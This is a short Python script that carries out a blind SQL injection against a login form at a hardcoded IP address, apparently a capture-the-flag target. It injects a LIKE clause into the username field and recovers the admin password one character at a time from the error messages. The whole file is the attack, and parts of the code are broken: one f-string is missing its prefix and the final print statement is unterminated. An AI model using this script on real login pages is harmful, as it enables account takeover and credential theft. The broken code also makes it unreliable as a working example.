#!/usr/bin/python3

import requests, bs4

letters = ['a','b','c','d','e','f','g','h','i','j','k','l','m','n','o','p','q','r','s','t','u','v','w','x','y','z','A','B','C','D','E','F','G','H','I','J','K','L','M','N','O','P','Q','R','S','T','U','V','W','X','Y','Z','1','2','3','4','5','6','7','8','9','0']
counter = 0
i = 0
partial_password = ''
while True:
    counter += 1
    form = {'username': f"admin' OR password LIKE '{partial_password + letters[i]}%'#", 'password': '{partial_password + letters[i]}'}
    response_file = requests.post('http://35.227.24.107/ded33f5bcf/login', data = form)
    crack_soup = bs4.BeautifulSoup(response_file.text, 'html.parser')
    summary = crack_soup.select('form div')
    print(f"Attempt - {counter}: Building Password: {partial_password + letters[i]}* --> {summary[0].getText()}")
    if (summary[0].getText() == 'Invalid password'):
        partial_password += letters[i]
        i = 0
    else:
        i += 1
    if (i == len(letters)):
        print(f" Your Password is: {partial_password[:len(letters)-2]})
        break
